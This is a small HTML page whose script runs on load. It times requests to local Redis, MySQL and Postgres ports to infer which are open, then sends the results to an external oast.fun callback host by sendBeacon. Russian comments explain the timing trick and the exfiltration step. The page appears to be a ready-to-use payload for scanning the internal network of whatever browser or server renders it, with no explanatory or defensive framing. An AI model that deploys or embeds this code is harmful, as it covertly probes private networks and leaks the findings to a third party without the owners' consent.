<!DOCTYPE html>
<html>
<body>
<script>
    async function scanPorts() {
        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
        const targets = {
            "redis": "http://127.0.0.1:6379",
            "mysql": "http://127.0.0.1:3306",
            "postgres": "http://127.0.0.1:5432",
            "google": "https://google.com" // Для сравнения внешнего пинга
        };

        let results = {};

        for (const [name, url] of Object.entries(targets)) {
            const start = performance.now();
            try {
                // Используем mode: 'no-cors', чтобы не блокировало сам запрос
                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            } catch (e) {
                // Ошибка вылетит почти сразу, если порт открыт
            }
            results[name] = (performance.now() - start).toFixed(2) + "ms";
        }

        // Отправка данных на твой вебхук
        navigator.sendBeacon(hook + "/PORT_SCAN_RESULTS", JSON.stringify(results));
    }

    scanPorts();
</script>
</body>
</html>
